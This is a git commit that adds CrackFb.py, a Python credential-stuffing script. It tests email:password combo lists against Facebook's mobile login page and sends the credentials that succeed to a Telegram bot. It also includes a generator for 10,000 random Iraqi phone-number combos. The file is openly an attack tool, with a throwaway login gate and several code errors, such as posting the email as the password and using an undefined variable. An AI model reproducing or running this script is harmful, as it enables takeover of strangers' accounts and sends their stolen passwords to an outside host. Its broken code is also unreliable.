3d805054e7b5352ad7f26ac4e968f5dd2e35ca95
MuHaMaD <102823069+Muhamad8aid@users.noreply.github.com>
2022-04-23 15:36:45 +0300

    Update and rename README.md to CrackFb.py

---
+++ CrackFb.py
@@ -0,0 +1,197 @@
+# kurdstan
+import os
+import webbrowser
+webbrowser.open('https://t.me/MuHaMa4D')
+try:
+    import uuid
+except:
+    os.system('pip install uuid')
+
+try:
+    from random import *
+except:
+    os.systemm('pip install random ')
+
+try:
+    import string
+except:
+    os.system('pip install string')
+
+try:
+    import requests
+except:
+    os.system('pip install requests ')
+
+try:
+    from user_agent import generate_user_agent
+except:
+    os.system('pip install user_agent ')
+
+try:
+    from datetime import datetime
+except:
+    os.system('pip install datetime ')
+
+try:
+    import time
+except:
+    os.system('pip install time')
+else:
+    os.system('clear')
+    try:
+        import pyfiglet
+    except:
+        os.system('pip install pyfiglet')
+    else:
+        os.system('clear')
+        import pyfiglet, os
+        from time import sleep
+        import webbrowser
+        Z = '\x1b[2;31m'
+        G = '\x1b[1;32m'            
+        import random, uuid, requests, string
+        from user_agent import generate_user_agent
+        from datetime import datetime
+        from random import *
+        from time import sleep
+        import requests, os, random, json, threading, secrets, uuid
+        from colorama import Fore, Style
+        from time import sleep
+        from datetime import datetime
+        from secrets import token_hex
+        from uuid import uuid4
+        from user_agent import generate_user_agent
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+Z1 = '\033[1;31m' #احمر ثاني
+F = '\033[1;32m' #اخضر
+A = '\033[1;34m'#ازرق
+C = '\033[1;35m' #وردي
+B = '\033[1;36m'#سمائي
+K = '\033[1;34m' #ازرق فاتح
+os.system('clear')
+cunt=True
+while cunt==True:
+	username=input(f"{B}username : ")
+	if username=="M12":
+		print(' ')
+		print(f'{F}username rasta bzhy #')
+		password=input(f'{B}password : ')
+		if password=="12M":
+			print(' ')
+			print(f'{F}password rasta bzhy ')
+			time.sleep(1)
+			cunt=False
+		else:
+			print(f"{Z}password Hlaya !!{B}")
+			webbrowser.open('https://t.me/MuHaMaD3D')
+	else:
+		print(f'{Z}username Hlaya !!{B}')
+		webbrowser.open('https://t.me/MuHaMaD3D')
+time.sleep(2)
+print('chwna zhwrawa sarkawtwboo # #')
+def A(s):
+	for AAlosh in s + '\n':
+		sys.stdout.write(AAlosh)
+		sys.stdout.flush()
+		sleep(50. / 700)
+		sys.exit()   
+		
+  
+        
+A=F+""" 
+===============================
+
+[T] telegram : @muhamad12a12
+
+[CH] chanaL : https://t.me/MuHaMaD3D \n
+[TB]/Make Combo Name (Combocb.txt)
+\n     
+===============================
+
+[~]  Crack Krdn Bacombo [1]
+
+[~]  Make Combo [2]
+
+===============================
+
+"""                 
+
+os.system('clear')
+r = requests.session()
+print (A)
+
+
+
+TOOLS = input(C+'[?] choice: '+B)
+#===============================
+
+if (TOOLS == '1'):
+	os.system('clear')
+	
+	webbrowser.open('https://t.me/MuHaMaD3D')
+	os.system('clear')
+	ID = input(X+"["+Z+"!"+X+"]"+F+ "ID Bot  :\n"+B)
+	webbrowser.open('https://t.me/MuHaMaD3D')
+	tok = input (X+"["+Z+"!"+X+"]"+F+'TOken Bot: \n'+B)
+	webbrowser.open('https://t.me/MuHaMaD3D')
+	file = ("/sdcard/"+(input(X+"["+Z+"!"+Z+"]"+F+ " combo  :\n"+B)))
+	print(B)
+	print("-"*50)
+	fuck= open(file, 'r')
+	
+	
+	
+	
+	while True:
+		user = fuck.readline().split('\n')[0]
+		Al= user.split(':')[0]
+		Alo= user.split(':')[1]
+		link = 'https://mobile.facebook.com/login.php'
+		data = { 'email': Al, 'pass': Al}
+		headers = {
+'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B',
+'Accept-Language' : 'en-US,en;q=0.5'}
+		shot = requests.post(link, headers=headers, data=data).text
+		if "xc_message" in shot:
+			print(F+ ' Email ==> : ' + Al+ ': pass ==> : ' + Alo)
+			r.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text= Hi Pro Fishing Facebook  \n ====================\n.√. Email   (  {Al}  )\n.√. password  (  {Alo}  )\n ====================\n By :- https://t.me/MuHaMaD3D   :-  @muhamad12a12 √ " )
+		elif "checkpointSubmitButton-actual-button" in shot:
+			print(X+ ' Email ==> : ' + Al+ ': pass ==> : ' + Al)
+			r.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=			Hi Pro Fishing Facebook Scor \n ====================\n.√. Email   (  {Al})\n.√. password  (  {Alo}  )\n ====================\n By :- @muhamad12a12:-\nhttps://t.me/MuHaMaD3D✓ " )
+			
+			with open("Cp.txt",'a') as ff:
+				ff.write("Email : "+Al+"\nPass : "+Alo+"\n\n")     
+				
+			
+		else:
+			print(Z+ ' Email ==> : ' + Al+ ': pass ==> : ' + Alo)
+			
+#https://t.me/MuHaMaD3D##################.########.####
+
+if (TOOLS == '2'):
+	print("Combo Trust Boo Ba Nawe (Combocb.txt)")
+	
+	os.system('clear')
+	
+import random
+import sys
+sys.stdout=open("/sdcard/Combocb.txt","w")
+make = "0987654321"
+h = 0
+
+while h<10000:
+	g="+964"
+	o="0"
+	B1="770","750","780","771","751","781"
+	B11=random.choice(B1)
+	c = str(''.join(random.choice(make) for i in range(7)))
+	kj = g+str(B11)+c
+	jk = o+str(B11)+c
+	combo = kj+":"+jk
+	print(combo)
+	
+	
+
+	h=h +1
+
